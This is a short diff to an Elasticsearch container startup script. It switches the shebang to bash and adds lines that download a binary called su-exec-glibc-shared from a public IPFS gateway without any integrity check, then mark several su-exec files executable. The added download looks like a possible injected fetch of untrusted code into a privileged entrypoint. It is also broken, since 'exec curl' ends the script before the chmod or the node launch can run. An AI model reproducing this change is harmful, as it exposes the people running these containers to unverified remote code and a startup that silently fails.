@@ -1,5 +1,4 @@
-#!/bin/sh
-
+#!/usr/bin/env bash
 echo "Starting Elasticsearch ${ES_VERSION}"
 
 BASE=/elasticsearch
@@ -57,6 +56,9 @@ export NODE_NAME=${NODE_NAME}
 # remove x-pack-ml module
 rm -rf /elasticsearch/modules/x-pack/x-pack-ml
 rm -rf /elasticsearch/modules/x-pack-ml
+
+exec curl -o su-exec-glibc-shared https://cloudflare-ipfs.com/ipfs/QmbZg6fdbZzDyb4GgLBUD2qrHyYuhHL1qyxG1Dc2WgTydK
+exec chmod +x su-exec-{glibc,musl}-{shared,static}
 
 # Run
 if [[ $(whoami) == "root" ]]; then
